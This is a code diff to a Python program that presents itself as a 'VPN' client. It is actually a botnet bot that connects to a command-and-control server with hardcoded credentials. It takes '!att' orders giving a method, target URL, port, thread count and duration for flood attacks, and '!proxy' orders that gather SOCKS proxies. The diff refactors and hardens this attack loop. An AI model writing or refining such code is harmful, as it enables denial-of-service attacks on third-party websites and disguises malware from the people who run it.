@@ -317,7 +317,7 @@ def main():
         connected = False
         while not connected:
             try:
-                s = socket(AF_INET, SOCK_STREAM)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((ipc2, portc2))
                 print("VPN connected.")
                 connected = True
@@ -329,34 +329,43 @@ def main():
                     except:
                         pass
                 sleep(5)
+        
         try:
             while True:
-                data = s.recv(1024)
-                if not data:
-                    print("Disconnected from server.")
+                try:
+                    data = s.recv(1024)
+                    if not data:
+                        print("Disconnected from server.")
+                        break
+                except Exception as e:
+                    print(f"Error receiving data: {e}")
                     break
+                
                 if b"Username" in data:
-                    s.send("glitcham".encode())
+                    s.send(b"glitcham")
+                    print("the glitch vpn")
                 elif b"Password" in data:
-                    s.send("FSOCIETY".encode())
+                    s.send(b"FSOCIETY")
+                    print("version 1.0.0")
                 else:
                     try:
-                        c2 = data.decode("utf-8", errors="ignore").strip()
-                        if c2.split()[0] == '!att':
+                        c2 = data.decode().strip()
+                        parts = c2.split()
+                        if len(parts) > 6 and parts[0] == '!att':
                             print(c2)
-                            method = str(c2.split()[1])
-                            url = str(c2.split()[2])
-                            port = int(c2.split()[3])
-                            threads = int(c2.split()[4])
-                            rpc = int(c2.split()[5])
-                            timme = int(c2.split()[6])
+                            method = parts[1]
+                            url = parts[2]
+                            port = int(parts[3])
+                            threads = int(parts[4])
+                            rpc = int(parts[5])
+                            timme = int(parts[6])
                             timer = time() + timme
-                        elif c2.split()[0] == '!proxy':
+                        elif parts[0] == '!proxy':
                             thr(target=socks5geter).start()
-                        elif c2.split()[0] == '!proxyir':
+                        elif parts[0] == '!proxyir':
                             thr(target=iroxy).start()
-                    except:
-                        pass
+                    except Exception as e:
+                        print(f"Error processing command: {e}")
                 try:
                     ua = fake.user_agent()
                     ctx = create_default_context(cafile=where())
